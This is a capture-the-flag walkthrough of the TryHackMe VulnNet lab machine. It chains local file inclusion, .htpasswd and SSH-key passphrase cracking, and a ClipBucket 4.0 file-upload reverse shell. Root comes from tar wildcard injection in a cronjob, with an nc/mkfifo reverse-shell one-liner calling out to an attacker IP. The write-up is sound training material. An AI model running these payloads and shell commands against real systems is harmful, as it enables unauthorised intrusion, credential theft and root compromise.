# VulnNet

## Introduction:

Welcome to my another writeup! In this TryHackMe [VulnNet](https://tryhackme.com/room/vulnnet1) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background:

> The purpose of this challenge is to make use of more realistic techniques and include them into a single machine to practice your skills.

- Difficulty: Medium
- Web Language: PHP

> You will have to add a machine IP with domain vulnnet.thm to your /etc/hosts

- Author: SkyWaves
- Discord: SkyWaves#1397

# Enumeration:

**Rustscan result:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# export IP=10.10.77.170

┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $IP -- -sC -sV -oN rustscan/rustscan.txt 
[...]
Open 10.10.77.170:22
Open 10.10.77.170:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 02:01 EDT
[...]
Nmap scan report for 10.10.77.170
[...]

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
|_http-title: VulnNet
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[...]
```

Open Ports 	 | Service
-------------|------------
22      	 | SSH
80			 | HTTP

## HTTP On Port 80:

**Fuzzing subdomain with `ffuf`:**

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm/ -H "HOST: FUZZ.vulnnet.thm" -fw 1689
[...]
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 1689
________________________________________________

broadcast               [Status: 401, Size: 468, Words: 42, Lines: 15, Duration: 202ms]
[...]
```

Add `broadcast` into `/etc/hosts` file:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# cat /etc/hosts                        
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.77.170 vulnnet.thm broadcast.vulnnet.thm
```

In http://vulnnet.thm/js/index__7ed54732.js, this JavaScript revealed the subdomain that we just found via `ffuf`:

```js
t.p="http://broadcast.vulnnet.thm",t(t.s=0)
```

In http://vulnnet.thm/js/index__d8338055.js, this JavaScript revealed the `index.php` accept `referer` GET parameter:

```js
n.p="http://vulnnet.thm/index.php?referer=",n(n.s=0)
```

In the `broadcast` subdomain, it'll prompt for a basic authentication, which is not useful at the moment:

However in the `referer` GET parameter, it appears to be vulnerable to `LFI`, or Local File Inclusion.

`http://vulnnet.thm/index.php?referer=/etc/passwd`

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet/images/a2.png)

Since the `broadcast` subdomain prompts a basic authentication, we can take a look at Apache configuration files to see any useful stuff for us.

`http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf`

```html
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName vulnnet.thm
	DocumentRoot /var/www/main
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/main>
		Order allow,deny
		allow from all
	</Directory>
</VirtualHost>

<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	<Directory /var/www/html>
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName "Restricted Content"
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	</Directory>
</VirtualHost>
```

Looks like the we can poke around with the `/etc/apache2/.htpasswd` file:

`http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd`

`developers:[Redacted]`

Since we found the hash of `deveploers` account, we can crack it via `John The Ripper`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# cat << EOF > developers_hash.txt
developers:[Redacted]
EOF
                                                                                                                      
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt developers_hash.txt 
[...]
[Redacted]   (developers)     
[...]
```

```
User:developers
Password:[Redacted]
```

Now let's login to the `broadcast` subdomain!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet/images/a3.png)

> ClipBucket is an Open Source and freely downloadable PHP script that will let you start your own Video Sharing website (YouTube Clone) in a matter of minutes. (https://github.com/arslancb/clipbucket)

To check the version of this ClipBucket, I'll go to `View Page Source`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet/images/a4.png)

`ClipBucket version 4.0`

To check is there any public exploit, I'll use `searchsploit` to do this:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# searchsploit ClipBucket 4.0
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
ClipBucket < 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection | php/webapps/44250.txt
------------------------------------------------------------------------------------ ---------------------------------
```

Exploit-db: https://www.exploit-db.com/exploits/44250

# Initial Shell:

`ClipBucket 4.0` has 3 vulnerabilities, OS Command Injection, Arbitrary File Upload, and Blind SQL Injection.

I'll use the Arbitrary File Upload vulnerability to gain an initial shell.

**44250.txt Arbitrary File Upload:**

```
Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"
[...]
```

To do so, first, I'll generate a php reverse shell via `msfvenom`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -o revshell.php
```

Then, upload the file with `curl`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# curl -u developers:[Redacted] -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
creating file{"success":"yes","file_name":"165752453575eede","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

Setup a `netcat` listener on port 443:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# nc -lnvp 443
listening on [any] 443 ...
```

Trigger the reverse shell via `curl`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# curl -u developers:[Redacted] -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/165752453575eede.php"
```

**Initial Shell:**

```
connect to [Redacted] from (UNKNOWN) [10.10.53.129] 50120
whoami; id; hostname; ip a

www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
vulnnet
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:10:3c:9b:38:99 brd ff:ff:ff:ff:ff:ff
    inet 10.10.53.129/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3154sec preferred_lft 3154sec
    inet6 fe80::10:3cff:fe9b:3899/64 scope link 
       valid_lft forever preferred_lft forever
```

# Privilege Escalation:

## www-data to server-management:

Since the initial shell is `www-data`, our final goal is to escalate to root.

In the `/etc/passwd` file, there are 2 users that are interesting: `root`, `server-management`

```
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
[...]
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
[...]
```

**Cronjob:**

We also saw there is a `cronjob` that might escalate to root:

```
cat /etc/crontab
[...]
# m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
```

**backupsrv.sh**

```bash
cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

Looks like it's backuping user `server-management` Documents files.

```
ls -lah /home
[...]
drwxrw---- 18 server-management server-management 4.0K Jan 24  2021 server-management
```

However, `www-data` can't read `server-management` user's file. Hence, we need to escalate to `server-management` first.

First, let's `find` any files that are interesting for us of user `server-management`:

```
find / -type f -user server-management 2>/dev/null

/var/backups/ssh-backup.tar.gz
```

We can copy the file to our reverse shell path:

```
cp /var/backups/ssh-backup.tar.gz /var/www/html/actions/CB_BEATS_UPLOAD_DIR/ssh-backup.tar.gz

ls -lah
[...]
-rw-r--r-- 1 www-data www-data 3.0K Jul 11 09:28 165752453575eede.php
-rw-r--r-- 1 www-data www-data 1.5K Jul 11 09:51 ssh-backup.tar.gz
```

Then, download that gzip file via `curl`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# curl -u developers:[Redacted] http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/ssh-backup.tar.gz -o ssh-backup.tar.gz
```

Decompress it and extract it via `gunzip` and `tar`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# gunzip ssh-backup.tar.gz                                                               
                                                                                                                      
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# tar -xf ssh-backup.tar 
                                                                                                                      
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# ls -lah               
[...]
-rw-------   1 nam  nam  1.8K Jan 24  2021 id_rsa
-rw-r--r--   1 root root 3.5K Jul 11 03:53 ssh-backup.tar
```

Next, we can crack the passphrase of this `id_rsa` via `ssh2john` and `John The Ripper`:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# ssh2john id_rsa > srvman_id_rsa.txt                          
                                                                                                                      
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt srvman_id_rsa.txt  
[...]
[Redacted]     (id_rsa)     
[...]
```

We now can `ssh` into `server-management`!

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# ssh -i id_rsa server-management@$IP                          
[...]
Enter passphrase for key 'id_rsa': 
[...]
server-management@vulnnet:~$ whoami; id
server-management
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management)
```

**user.txt**

```
server-management@vulnnet:~$ cat user.txt 
THM{Redacted}
```

Now I'm `server-management`, we now can escalate our privilege to root via cronjob!

**backupsrv.sh**

```bash
# What to backup. 
cd /home/server-management/Documents
backup_files="*"
[...]
# Backup the files using tar.
tar czf $dest/$archive_file $backup_files
```

Since the `backup_files` variable is using a wildcard(`*`), we can abuse it to escalate our prvilege to root!

According to the [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) website, we can break out from restricted environments by spawning an interactive system shell.

```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

As `backup_files` variable is using a wildcard, we can create 2 files in `/home/server-management/Documents` directory.

- --checkpoint=1
- --checkpoint-action=exec=/bin/sh

Those files will be interpreted as options passed to the `tar` command.

Now let's create 3 files in the `Documents` directory:

1. Bash reverse shell
2. --checkpoint=1
3. --checkpoint-action=exec=/bin/sh [reverse_shell.sh]

```
server-management@vulnnet:~/Documents$ cat << EOF > revshell.sh
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [Your_IP] 4444 >/tmp/f
> EOF
server-management@vulnnet:~/Documents$ chmod +x revshell.sh
server-management@vulnnet:~/Documents$ touch "/home/server-management/Documents/--checkpoint=1"
server-management@vulnnet:~/Documents$ touch "/home/server-management/Documents/--checkpoint-action=exec=/bin/sh revshell.sh"
```

Setup a `netcat` listener on port 4444, and wait 2 minutes for the cronjob run:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# nc -lnvp 4444
listening on [any] 4444 ...
```

**Proof-of-Concept:**

```
server-management@vulnnet:~/Documents$ rm *
rm: unrecognized option '--checkpoint=1'
Try 'rm ./'--checkpoint=1'' to remove the file '--checkpoint=1'.
Try 'rm --help' for more information.
```

In this example, I wanna remove all the files in the current directory with `rm *`. However, the `rm` command treat file `'--checkpoint=1'` as an option, and throws an error.

# Rooted:

```
┌──(root💀nam)-[~/ctf/thm/ctf/VulnNet]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [Redacted] from (UNKNOWN) [10.10.53.129] 55968
/bin/sh: 0: can't access tty; job control turned off
# whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
```

**root.txt**

```
# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Subdomain Enumeration
2. Local File Inclusion(LFI)
3. Cracking Hashes and Passphrase
4. ClipBucket 4.0 Arbitrary File Upload
5. Privilege Escalation Via Cronjob and Tar